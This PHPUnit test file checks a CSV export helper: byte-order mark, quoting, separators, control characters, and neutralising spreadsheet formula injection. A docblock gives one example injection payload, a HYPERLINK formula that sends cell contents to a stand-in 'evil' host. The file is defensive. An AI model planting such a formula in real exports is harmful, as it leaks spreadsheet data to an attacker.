<?php

declare(strict_types=1);

namespace Macrolab\Tests\Unit;

use Macrolab\Csv;
use PHPUnit\Framework\TestCase;

/**
 * The export goes to a spreadsheet, which means two things have to be right:
 * the quoting, and the fact that spreadsheets execute cells that begin with an
 * operator.
 */
final class CsvTest extends TestCase
{
    public function testItStartsWithAByteOrderMark(): void
    {
        // Without this, Excel on Windows reads UTF-8 as the local codepage and
        // every name with a diacritic arrives as mojibake.
        self::assertStringStartsWith(Csv::BOM, Csv::fromRows(['a'], []));
    }

    public function testItQuotesCommasQuotesAndNewlines(): void
    {
        $body = Csv::fromRows(['note'], [['one, two']]);
        self::assertStringContainsString('"one, two"', $body);

        $body = Csv::fromRows(['note'], [['he said "hi"']]);
        self::assertStringContainsString('"he said ""hi"""', $body);

        $body = Csv::fromRows(['note'], [["first\nsecond"]]);
        self::assertStringContainsString("\"first\nsecond\"", $body);
    }

    public function testASemicolonSeparatorSplitsOnSemicolonsAndQuotesThem(): void
    {
        $body = Csv::fromRows(['date', 'note'], [['2026-10-04', 'one; two, three']], ';');

        self::assertStringStartsWith(Csv::BOM, $body);
        self::assertStringContainsString("date;note\n", $body);
        self::assertStringContainsString('2026-10-04;"one; two, three"', $body);
    }

    public function testACommaSeparatedFileLeavesSemicolonsUnquoted(): void
    {
        // No space in the value: fputcsv quotes any field containing one.
        $body = Csv::fromRows(['note'], [['one;two']]);

        self::assertStringContainsString("one;two\n", $body);
    }

    /**
     * =HYPERLINK("http://evil/?x="&A1,"click") in a note field runs when the
     * file is opened. The note is typed by a user and the display name comes
     * from the administrator or from SSO, so both are attacker-influenced.
     */
    public function testItNeutralisesFormulas(): void
    {
        foreach (['=1+1', '+1', '-1', '@SUM(A1)', "\tx", "\rx"] as $dangerous) {
            self::assertStringStartsWith(
                "'",
                Csv::cell($dangerous),
                'A cell beginning with an operator must be neutralised: ' . $dangerous
            );
        }
    }

    public function testItLeavesOrdinaryValuesAlone(): void
    {
        self::assertSame('3.50', Csv::cell('3.50'));
        self::assertSame('alice', Csv::cell('alice'));
        self::assertSame('2026-09-17', Csv::cell('2026-09-17'));
        self::assertSame('210', Csv::cell(210));
        self::assertSame('', Csv::cell(null));
    }

    public function testItStripsControlCharacters(): void
    {
        self::assertSame('ab', Csv::cell("a\x00b"));
    }

    public function testANegativeNumberIsNeutralisedRatherThanLost(): void
    {
        // It reads as a formula to a spreadsheet, so it is prefixed. The value
        // is still legible, which is what matters for an export.
        self::assertSame("'-5", Csv::cell('-5'));
    }

    public function testHeaderAndRowsLineUp(): void
    {
        $body = Csv::fromRows(['date', 'hours'], [['2026-09-17', '3.50'], ['2026-09-18', '1.25']]);
        $lines = array_values(array_filter(explode("\n", trim(str_replace("\r", '', $body)))));

        self::assertCount(3, $lines);
        self::assertSame(Csv::BOM . 'date,hours', $lines[0]);
        self::assertSame('2026-09-17,3.50', $lines[1]);
    }
}
